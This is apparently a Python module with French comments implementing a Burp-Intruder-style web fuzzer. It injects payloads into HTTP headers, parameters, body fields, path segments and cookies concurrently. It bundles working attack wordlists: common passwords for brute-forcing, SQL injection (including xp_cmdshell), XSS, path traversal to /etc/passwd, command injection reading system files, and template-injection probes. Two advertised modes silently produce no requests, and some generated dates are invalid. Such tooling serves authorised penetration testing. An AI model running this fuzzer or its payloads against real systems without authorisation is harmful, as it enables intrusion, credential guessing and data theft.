"""Intruder style Burp — fuzzing paramétrable avec positions, payloads et filtres.

Modes d'attaque :
- sniper : une position à la fois, les autres conservent leur valeur originale
- cluster_bomb : toutes les combinaisons de toutes les positions

Positions supportées :
- header:<nom>     → injecte dans un en-tête HTTP
- body:<chemin>    → injecte dans le corps (support JSON / form-urlencoded)
- param:<nom>      → injecte dans un paramètre GET
- path:<index>     → injecte dans un segment de chemin
- cookie:<nom>     → injecte dans un cookie
- raw              → remplace tout le corps

Payloads prédéfinies intégrées :
- numbers (1-100), dates, common passwords (top 100), SQLi, XSS
"""

import asyncio
import re
import time
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import StrEnum
from typing import Any
from urllib.parse import urlencode, urlparse, urlunparse

import httpx

from decepticon.navmax.core.logging import get_logger

logger = get_logger(__name__)


class IntruderMode(StrEnum):
    SNIPER = "sniper"
    BATTERING_RAM = "battering_ram"
    PITCHFORK = "pitchfork"
    CLUSTER_BOMB = "cluster_bomb"


MAX_POSITIONS = 100


# ---------------------------------------------------------------------------
# Payloads prédéfinis
# ---------------------------------------------------------------------------

PREDEFINED_PAYLOADS: dict[str, list[str]] = {}

# --- Nombres 1-100 ---
PREDEFINED_PAYLOADS["numbers"] = [str(i) for i in range(1, 101)]


# --- Dates récentes et courantes ---
def _generate_dates() -> list[str]:
    dates: list[str] = []
    # Dates courantes de test
    for year in [2023, 2024, 2025, 2026]:
        for month in [1, 6, 12]:
            for day in [1, 15, 31]:
                if month in (1, 6, 12) and day <= 31:
                    dates.append(f"{year:04d}-{month:02d}-{day:02d}")
                    dates.append(f"{day:02d}/{month:02d}/{year:04d}")
    # Aujourd'hui et variantes
    now = datetime.now(UTC)
    dates.append(now.strftime("%Y-%m-%d"))
    dates.append(now.strftime("%d/%m/%Y"))
    dates.append(now.strftime("%m/%d/%Y"))
    return dates


PREDEFINED_PAYLOADS["dates"] = _generate_dates()

# --- Top 100 mots de passe ---
COMMON_PASSWORDS: list[str] = [
    "password",
    "123456",
    "12345678",
    "qwerty",
    "abc123",
    "monkey",
    "1234567",
    "letmein",
    "trustno1",
    "dragon",
    "baseball",
    "iloveyou",
    "master",
    "sunshine",
    "welcome",
    "shadow",
    "ashley",
    "football",
    "jesus",
    "michael",
    "ninja",
    "mustang",
    "password1",
    "admin",
    "administrator",
    "root",
    "toor",
    "passw0rd",
    "p@ssword",
    "Passw0rd!",
    "test",
    "test123",
    "guest",
    "demo",
    "changeme",
    "secret",
    "1234",
    "12345",
    "123456789",
    "1234567890",
    "qwerty123",
    "1q2w3e",
    "123qwe",
    "qwe123",
    "pass",
    "pass123",
    "Pa$$word",
    "Pa$$w0rd",
    "P@ssw0rd",
    "admin123",
    "admin1",
    "Admin123",
    "Admin@123",
    "manager",
    "server",
    "backup",
    "cisco",
    "router",
    "switch",
    "hp",
    "dell",
    "ibm",
    "oracle",
    "mysql",
    "sql",
    "default",
    "default1",
    "system",
    "sysadmin",
    "sa",
    "user",
    "user1",
    "user123",
    "operator",
    "support",
    "info",
    "marketing",
    "sales",
    "finance",
    "hr",
    "admin2019",
    "admin2020",
    "admin2021",
    "admin2022",
    "admin2023",
    "admin2024",
    "password123",
    "password1234",
    "Password1",
    "Password123",
    "P@ssword123",
    "Passw0rd123",
    "Changeme1",
    "Temp123",
    "Temp@123",
    "Welcome1",
    "Welcome123",
    "Summer2023",
    "Winter2023",
    "Spring2024",
    "Autumn2024",
    "letmein123",
    "qwerty12345",
    "1qaz2wsx",
    "zaqxsw",
]

PREDEFINED_PAYLOADS["passwords"] = COMMON_PASSWORDS[:100]

# --- SQLi wordlist ---
PREDEFINED_PAYLOADS["sqli"] = [
    "'",
    "''",
    "';",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    '" OR "1"="1',
    '" OR "1"="1" --',
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT @@version,2,3--",
    "' UNION SELECT version(),2,3--",
    "' AND SLEEP(1)--",
    "' AND SLEEP(5)--",
    "' OR SLEEP(1)--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:01'--",
    "'; WAITFOR DELAY '00:00:05'--",
    "1' AND 1=1 UNION SELECT 1,2,3--",
    "1 AND 1=1 UNION SELECT 1,2,3",
    "') OR 1=1--",
    "')) OR 1=1--",
    '" OR 1=1--',
    '")) OR 1=1--',
    "1;SELECT 1",
    "1';SELECT 1--",
    "' EXEC xp_cmdshell('dir')--",
    "' EXEC xp_cmdshell('whoami')--",
    "' HAVING 1=1--",
    "' GROUP BY 1,2,3,4,5,6,7,8--",
    "'; SELECT * FROM users--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
]

# --- XSS wordlist ---
PREDEFINED_PAYLOADS["xss"] = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "';alert(1);//",
    '";alert(1);//',
    "';alert(1)-->",
    '" autofocus onfocus=alert(1)>',
    "javascript:alert(1)",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "<div/onmouseover='alert(1)'>HOVER</div>",
    '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
    "{{constructor.constructor('alert(1)')()}}",
    '"-alert(1)-"',
    "'-alert(1)-'",
    "`-alert(1)-`",
]

# --- Path traversal wordlist ---
PREDEFINED_PAYLOADS["path_traversal"] = [
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "/etc/passwd",
    "..\\",
    "..\\..\\",
    "..\\..\\..\\",
    "..\\..\\..\\..\\",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd%00",
    "../../../etc/passwd%00",
    "..\\..\\..\\windows\\win.ini%00",
]

# --- Command injection wordlist ---
PREDEFINED_PAYLOADS["command_injection"] = [
    # Séparateurs de base
    "; ls",
    "; ls -la",
    "| ls",
    "| ls -la",
    "`ls`",
    "`id`",
    "$(cat /etc/passwd)",
    "$(id)",
    "& ping -c 1 127.0.0.1",
    "&& dir",
    "| dir",
    "; id",
    "| id",
    "$(whoami)",
    "'; ls -la'",
    '"; ls -la"',
    "| whoami",
    "; whoami",
    "& whoami",
    "&& whoami &&",
    "|| whoami",
    "'; cat /etc/passwd; '",
    '"; cat /etc/passwd; "',
    # Commandes Unix supplémentaires
    "| cat /etc/hosts",
    "; cat /etc/hosts",
    "`cat /etc/hosts`",
    "| nslookup 127.0.0.1",
    "; nslookup 127.0.0.1",
    "& nslookup 127.0.0.1",
    # Commandes Windows
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "| dir C:\\Windows\\System32",
    "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    # Encodage URL simple
    "%3Bid",
    "%7Cid",
    "%3Bcat%20/etc/passwd",
    # Double encodage URL
    "%253Bid",
    "%257Cid",
]

# --- SSTI wordlist ---
PREDEFINED_PAYLOADS["ssti"] = [
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{config}}",
    "{{request}}",
    "{{self.__init__.__globals__.__builtins__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${7*7}",
    "${class}",
    "${env}",
    "#{7*7}",
    "*{7*7}",
]


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass
class IntruderResult:
    """Résultat d'une itération de fuzzing Intruder."""

    request_modifie: dict[str, Any]
    status_code: int
    response_length: int
    response_time_ms: float
    match: bool = False
    payload_position: str = ""
    payload_value: str = ""
    error: str | None = None
    response_body: str = ""


@dataclass
class IntruderReport:
    """Rapport complet d'une attaque Intruder."""

    target_url: str
    target_method: str
    mode: str  # sniper, cluster_bomb, pitchfork ou battering_ram
    positions: list[str]
    total_requests: int
    results: list[IntruderResult] = field(default_factory=list)
    duration_ms: float = 0.0

    @property
    def matched(self) -> list[IntruderResult]:
        """Résultats où le pattern grep a matché."""
        return [r for r in self.results if r.match]

    @property
    def errors(self) -> list[IntruderResult]:
        """Résultats avec des erreurs."""
        return [r for r in self.results if r.error]

    @property
    def status_counts(self) -> dict[int, int]:
        """Comptage par code de statut HTTP."""
        counts: dict[int, int] = {}
        for r in self.results:
            counts[r.status_code] = counts.get(r.status_code, 0) + 1
        return counts


# ---------------------------------------------------------------------------
# Filtres
# ---------------------------------------------------------------------------


@dataclass
class IntruderFilters:
    """Filtres à appliquer aux résultats."""

    filter_status: list[int] | None = None  # Garder seulement ces status
    filter_length: tuple[int, int] | None = None  # (min, max) taille de réponse
    grep_match: str | None = None  # Regex à chercher dans la réponse

    def matches(self, result: IntruderResult) -> bool:
        """Vérifie si un résultat passe tous les filtres."""
        if self.filter_status and result.status_code not in self.filter_status:
            return False
        if self.filter_length:
            lo, hi = self.filter_length
            if not (lo <= result.response_length <= hi):
                return False
        # grep_match est géré comme un flag 'match' sur le résultat
        # et ne filtre PAS les résultats — il les marque
        return True


# ---------------------------------------------------------------------------
# Moteur de positions
# ---------------------------------------------------------------------------


def _parse_position(position: str) -> tuple[str, str]:
    """Parse une chaîne de position en (type, nom).

    Formats acceptés :
        header:X-Custom, body:username, param:id, path:2, cookie:PHPSESSID, raw

    Retourne :
        (type, name) où type est 'header', 'body', 'param', 'path', 'cookie' ou 'raw'
    """
    if ":" in position:
        parts = position.split(":", 1)
        return (parts[0].strip().lower(), parts[1].strip())
    return (position.strip().lower(), "")


def _apply_payload(
    request: dict[str, Any],
    position: str,
    payload: str,
) -> dict[str, Any]:
    """Applique un payload à une position d'une requête.

    Retourne une copie modifiée de la requête (ne mute pas l'original).

    Args:
        request: dict avec les clés method, url, headers, body
        position: chaîne de position (ex: "header:X-Custom")
        payload: valeur à injecter

    Returns:
        Nouveau dict request modifié

    """
    req = {
        "method": request.get("method", "GET"),
        "url": request.get("url", ""),
        "headers": dict(request.get("headers", {})),
        "body": request.get("body"),
    }

    pos_type, pos_name = _parse_position(position)

    if pos_type == "header":
        if pos_name:
            req["headers"][pos_name] = payload

    elif pos_type == "body":
        body = req.get("body")
        if body is None:
            req["body"] = payload
        elif isinstance(body, str):
            # Support JSON simple — injecter dans une clé
            import json as _json

            try:
                parsed = _json.loads(body)
                if isinstance(parsed, dict) and pos_name:
                    _set_nested_key(parsed, pos_name, payload)
                    req["body"] = _json.dumps(parsed)
                elif not pos_name:
                    # raw body replacement
                    req["body"] = payload
                else:
                    # fallback: replace in raw string
                    req["body"] = body
            except (_json.JSONDecodeError, ValueError):
                # Traiter comme form-urlencoded ou texte brut
                if pos_name:
                    req["body"] = _replace_form_field(body, pos_name, payload)
                else:
                    req["body"] = payload
        elif isinstance(body, bytes):
            req["body"] = payload.encode("utf-8", errors="replace")
        else:
            req["body"] = str(payload)

    elif pos_type == "param":
        parsed = urlparse(req["url"])
        from urllib.parse import parse_qs

        params = parse_qs(parsed.query, keep_blank_values=True)
        params[pos_name] = [payload]
        new_query = urlencode(params, doseq=True)
        req["url"] = urlunparse(parsed._replace(query=new_query))

    elif pos_type == "path":
        parsed = urlparse(req["url"])
        segments = parsed.path.split("/")
        try:
            idx = int(pos_name)
            # idx=0 = premier segment après le '/'
            actual_idx = min(idx, len(segments) - 1)
            segments[actual_idx] = payload
        except ValueError:
            # Remplacer le premier segment qui correspond
            for i, seg in enumerate(segments):
                if seg == pos_name:
                    segments[i] = payload
                    break
        new_path = "/".join(segments)
        req["url"] = urlunparse(parsed._replace(path=new_path))

    elif pos_type == "cookie":
        cookie_header = req["headers"].get("Cookie", "")
        cookies = _parse_cookies(cookie_header)
        if pos_name:
            cookies[pos_name] = payload
        else:
            # raw cookie replacement
            cookies = {"__raw__": payload}
        req["headers"]["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

    elif pos_type == "raw":
        original_body = req.get("body")
        if isinstance(original_body, bytes):
            req["body"] = (
                payload.encode("utf-8", errors="replace") if isinstance(payload, str) else payload
            )
        else:
            req["body"] = payload

    return req


def _set_nested_key(d: dict, path: str, value: Any) -> None:
    """Définit une valeur dans un dict en suivant un chemin 'parent.child.key'."""
    parts = path.split(".")
    current = d
    for part in parts[:-1]:
        if part not in current or not isinstance(current[part], dict):
            current[part] = {}
        current = current[part]
    current[parts[-1]] = value


def _replace_form_field(body: str, field_name: str, value: str) -> str:
    """Remplace une valeur de champ dans un body form-urlencoded."""
    import urllib.parse as _up

    try:
        params = _up.parse_qs(body, keep_blank_values=True)
    except ValueError:
        return body
    params[field_name] = [value]
    return _up.urlencode(params, doseq=True)


def _parse_cookies(cookie_header: str) -> dict[str, str]:
    """Parse un en-tête Cookie en dict."""
    cookies: dict[str, str] = {}
    if not cookie_header:
        return cookies
    for part in cookie_header.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()
        elif part:
            cookies[part] = ""
    return cookies


# ---------------------------------------------------------------------------
# Intruder
# ---------------------------------------------------------------------------


class Intruder:
    """Fuzzer paramétrable style Burp Intruder.

    Permet de définir des positions de fuzzing (headers, body, paramètres, etc.)
    et de tester différentes combinaisons de payloads avec des filtres.

    Args:
        timeout: Timeout des requêtes HTTP en secondes
        concurrency: Nombre maximum de requêtes concurrentes
        verify_ssl: Vérifier les certificats TLS

    """

    def __init__(
        self,
        timeout: float = 15.0,
        concurrency: int = 10,
        verify_ssl: bool = False,
    ) -> None:
        self.timeout = timeout
        self.concurrency = concurrency
        self.verify_ssl = verify_ssl
        self._client: httpx.AsyncClient | None = None
        self._semaphore: asyncio.Semaphore | None = None

    async def _get_client(self) -> httpx.AsyncClient:
        if self._client is None:
            self._client = httpx.AsyncClient(
                verify=self.verify_ssl,
                timeout=httpx.Timeout(self.timeout),
                follow_redirects=False,
                headers={"User-Agent": "NavMAX-Intruder/0.1"},
            )
        return self._client

    async def close(self) -> None:
        """Ferme le client HTTP."""
        if self._client:
            await self._client.aclose()
            self._client = None

    # ------------------------------------------------------------------
    # API publique
    # ------------------------------------------------------------------

    async def attack(
        self,
        request: dict[str, Any],
        positions: list[str],
        payloads: dict[str, list[str]],
        mode: str = "cluster_bomb",
        filters: dict[str, Any] | None = None,
    ) -> IntruderReport:
        """Lance une attaque Intruder sur la requête cible.

        Args:
            request: Requête de base sous forme de dict avec les clés :
                     method, url, headers (dict), body (str/bytes/None)
            positions: Liste de positions à fuzzer (ex: ["header:X-Custom", "param:id"])
            payloads: Dictionnaire position → liste de valeurs à tester.
                      Les clés doivent correspondre aux chaînes de positions.
                      Si une clé est un nom de payload prédéfini ("sqli", "xss", etc.),
                      elle est automatiquement résolue.
            mode: "sniper" ou "cluster_bomb"
            filters: Dict optionnel avec les clés :
                     filter_status (list[int]), filter_length ((int,int)),
                     grep_match (str)

        Returns:
            IntruderReport contenant tous les résultats

        Raises:
            ValueError: Si les paramètres sont invalides

        """
        t0 = time.monotonic()
        client = await self._get_client()
        self._semaphore = asyncio.Semaphore(self.concurrency)

        mode = (
            IntruderMode(mode.lower())
            if mode.lower() in IntruderMode._value2member_map_
            else mode.lower()
        )
        if mode not in (
            IntruderMode.SNIPER,
            IntruderMode.CLUSTER_BOMB,
            IntruderMode.PITCHFORK,
            IntruderMode.BATTERING_RAM,
        ):
            msg = f"Mode invalide : {mode} (attendu: sniper, cluster_bomb, pitchfork ou battering_ram)"
            raise ValueError(
                msg,
            )

        if not positions:
            msg = "Au moins une position est requise"
            raise ValueError(msg)
        if len(positions) > MAX_POSITIONS:
            msg = f"Trop de positions : {len(positions)} (max {MAX_POSITIONS})"
            raise ValueError(msg)

        # Résoudre les payloads prédéfinis
        resolved_payloads = self._resolve_payloads(payloads)

        # Appliquer les filtres
        intruder_filters = IntruderFilters(
            filter_status=filters.get("filter_status") if filters else None,
            filter_length=filters.get("filter_length") if filters else None,
            grep_match=filters.get("grep_match") if filters else None,
        )

        # Générer toutes les combinaisons (position, payload)
        # Pour cluster_bomb: liste de listes de (position, payload), chaque sous-liste
        # contient toutes les modifications à appliquer simultanément
        combinations = self._generate_combinations(
            positions,
            resolved_payloads,
            mode,
            request,
        )

        report = IntruderReport(
            target_url=request.get("url", ""),
            target_method=request.get("method", "GET"),
            mode=mode,
            positions=list(positions),
            total_requests=len(combinations),
        )

        if not combinations:
            report.duration_ms = (time.monotonic() - t0) * 1000
            return report

        # Exécuter toutes les requêtes en parallèle (avec throttling)
        tasks = [
            self._execute_attack(
                client,
                base_request=request,
                modifications=combo,  # combo = [(pos, payload), ...]
                filters=intruder_filters,
            )
            for combo in combinations
        ]

        results: list[IntruderResult] = []
        for coro in asyncio.as_completed(tasks):
            try:
                result = await coro
                if result is not None:
                    results.append(result)
            except Exception as e:
                logger.exception("intruder_task_error", error=str(e))

        report.results = results
        report.duration_ms = (time.monotonic() - t0) * 1000

        logger.info(
            "intruder_attack_complete",
            url=report.target_url[:80],
            mode=mode,
            total=report.total_requests,
            completed=len(report.results),
            duration_ms=round(report.duration_ms, 0),
        )

        return report

    # ------------------------------------------------------------------
    # Méthodes internes
    # ------------------------------------------------------------------

    def _resolve_payloads(
        self,
        payloads: dict[str, list[str]],
    ) -> dict[str, list[str]]:
        """Résout les payloads prédéfinis en listes de chaînes.

        Si une clé de payloads correspond à une clé de PREDEFINED_PAYLOADS,
        elle est remplacée par sa valeur prédéfinie.
        """
        resolved: dict[str, list[str]] = {}
        for key, values in payloads.items():
            if key in PREDEFINED_PAYLOADS:
                # Utiliser le payload prédéfini
                resolved[key] = list(PREDEFINED_PAYLOADS[key])
            else:
                resolved[key] = list(values)
        return resolved

    def _generate_combinations(
        self,
        positions: list[str],
        payloads: dict[str, list[str]],
        mode: str,
        request: dict[str, Any],
    ) -> list[list[tuple[str, str]]]:
        """Génère toutes les combinaisons de modifications à tester.

        Chaque élément de la liste retournée est une liste de tuples (position, payload)
        qui doivent être appliqués SIMULTANÉMENT à la même requête.

        En mode sniper : chaque sous-liste contient un seul tuple (une position modifiée,
        les autres gardent leur valeur originale).

        En mode cluster_bomb : chaque sous-liste contient un tuple par position.
        C'est le produit cartésien complet des payloads de toutes les positions.
        """
        combinations: list[list[tuple[str, str]]] = []

        if mode == IntruderMode.SNIPER:
            # Sniper: une position à la fois
            payload_keys = list(payloads.keys())

            if len(payload_keys) == 1:
                # Un seul payload set → l'appliquer à chaque position
                single_key = payload_keys[0]
                all_payload_values = payloads[single_key]
                for pos in positions:
                    for pval in all_payload_values:
                        combinations.append([(pos, pval)])
            else:
                # Plusieurs payload sets → associer par index
                for i, pos in enumerate(positions):
                    key = pos
                    if key in payloads:
                        pvals = payloads[key]
                    elif i < len(payload_keys):
                        pvals = payloads[payload_keys[i]]
                    else:
                        continue
                    for pval in pvals:
                        combinations.append([(pos, pval)])

        elif mode == IntruderMode.CLUSTER_BOMB:
            # Cluster bomb: produit cartésien — chaque combinaison modifie
            # TOUTES les positions simultanément avec un payload par position
            import itertools

            # Pour chaque position, collecter la liste des payloads
            pos_payload_sets: list[list[tuple[str, str]]] = []
            for pos in positions:
                if pos in payloads:
                    pvals = payloads[pos]
                else:
                    # Fallback: utiliser le premier payload set
                    first_key = next(iter(payloads.keys()), None)
                    if first_key:
                        pvals = payloads[first_key]
                    else:
                        continue
                pos_payload_sets.append([(pos, pv) for pv in pvals])

            if pos_payload_sets:
                # Produit cartésien: chaque combo touche toutes les positions
                for combo in itertools.product(*pos_payload_sets):
                    combinations.append(list(combo))

        return combinations

    async def _execute_attack(
        self,
        client: httpx.AsyncClient,
        base_request: dict[str, Any],
        modifications: list[tuple[str, str]],
        filters: IntruderFilters,
    ) -> IntruderResult | None:
        """Exécute une requête d'attaque unique avec throttling.

        Applique toutes les modifications (position, payload) à la même requête
        de base, puis envoie la requête modifiée.

        Args:
            client: Client HTTP asynchrone
            base_request: Requête de base à modifier
            modifications: Liste de tuples (position, payload) à appliquer
            filters: Filtres à appliquer au résultat

        """
        async with self._semaphore:  # type: ignore[union-attr]
            # Appliquer TOUTES les modifications à la même requête de base
            modified = dict(base_request)
            for position, payload in modifications:
                modified = _apply_payload(modified, position, payload)

            # Décrire la combinaison pour le résultat
            first_pos = modifications[0][0] if modifications else ""
            first_pay = modifications[0][1] if modifications else ""

            # Envoyer la requête
            t0 = time.monotonic()
            try:
                resp = await client.request(
                    method=modified["method"],
                    url=modified["url"],
                    headers=modified["headers"],
                    content=modified.get("body"),
                )
                elapsed = (time.monotonic() - t0) * 1000

                resp_body = resp.text
                status_code = resp.status_code
                response_length = len(resp.content)
                error = None
            except httpx.TimeoutException:
                elapsed = (time.monotonic() - t0) * 1000
                status_code = 0
                response_length = 0
                resp_body = ""
                error = "Timeout"
            except httpx.RequestError as e:
                elapsed = (time.monotonic() - t0) * 1000
                status_code = 0
                response_length = 0
                resp_body = ""
                error = str(e)

            # Vérifier le grep_match
            match = False
            if filters.grep_match and not error:
                try:
                    match = bool(re.search(filters.grep_match, resp_body, re.IGNORECASE))
                except re.error:
                    match = filters.grep_match in resp_body

            # Construire le résultat
            return IntruderResult(
                request_modifie={
                    "method": modified["method"],
                    "url": modified["url"],
                    "headers": modified["headers"],
                    "body": modified.get("body"),
                    "modifications": modifications,  # Toutes les modifs appliquées
                },
                status_code=status_code,
                response_length=response_length,
                response_time_ms=round(elapsed, 1),
                match=match,
                payload_position=first_pos,
                payload_value=first_pay,
                error=error,
                response_body=resp_body[:2000] if resp_body else "",
            )



# ---------------------------------------------------------------------------
# Fonction utilitaire pour lancer une attaque rapide
# ---------------------------------------------------------------------------


async def quick_attack(
    url: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    positions: list[str] | None = None,
    payload_category: str = "xss",
    mode: str = IntruderMode.SNIPER,
    **kwargs: Any,
) -> IntruderReport:
    """Lance une attaque Intruder rapide avec une configuration minimale.

    Args:
        url: URL cible
        method: Méthode HTTP
        headers: En-têtes HTTP optionnels
        body: Corps de la requête
        positions: Positions à fuzzer (défaut: [f"param:{p}" pour chaque param GET])
        payload_category: Catégorie de payload prédéfini ("xss", "sqli", etc.)
        mode: "sniper" ou "cluster_bomb"
        **kwargs: Arguments supplémentaires pour Intruder()

    Returns:
        IntruderReport avec les résultats

    """
    # Construire la requête de base
    request: dict[str, Any] = {
        "method": method,
        "url": url,
        "headers": headers or {},
        "body": body,
    }

    # Positions par défaut: tous les paramètres GET
    if positions is None:
        parsed = urlparse(url)
        from urllib.parse import parse_qs

        params = parse_qs(parsed.query)
        positions = [f"param:{p}" for p in params]
        if not positions:
            positions = ["raw"]

    # Construire le dict payloads
    payloads: dict[str, list[str]] = {}
    for pos in positions:
        payloads[pos] = []  # Sera résolu par _resolve_payloads

    # Créer l'Intruder et lancer l'attaque
    intruder = Intruder(**kwargs)
    try:
        return await intruder.attack(
            request=request,
            positions=positions,
            payloads={payload_category: []},  # Résolu via prédéfini
            mode=mode,
        )
    finally:
        await intruder.close()
